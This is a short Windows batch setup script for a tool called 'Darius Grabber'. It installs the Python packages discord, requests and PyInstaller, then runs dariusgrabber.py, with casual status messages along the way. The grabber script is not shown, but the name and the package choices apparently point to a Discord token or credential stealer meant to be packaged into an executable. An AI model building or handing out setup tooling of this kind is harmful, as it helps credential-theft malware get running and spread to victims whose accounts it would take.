@echo off
color 0a
title Darius Grabber Setup

echo.
echo ====================================
echo  Setting up Darius Grabber
echo ====================================
echo.

echo installing the things u need to run darius grabber..
pip install discord requests PyInstaller

if %errorlevel% neq 0 (
    echo.
    echo  couldnt install modules :(
    echo.
    pause
    exit /b 1
)

echo.
echo everything was downloaded correctly ;P
echo.
echo starting darius grabber
echo.

python dariusgrabber.py

if %errorlevel% neq 0 (
    echo.
    echo  we couldnt run darius grabber, retry again, or open it manually
    echo.
)

pause
exit /b 0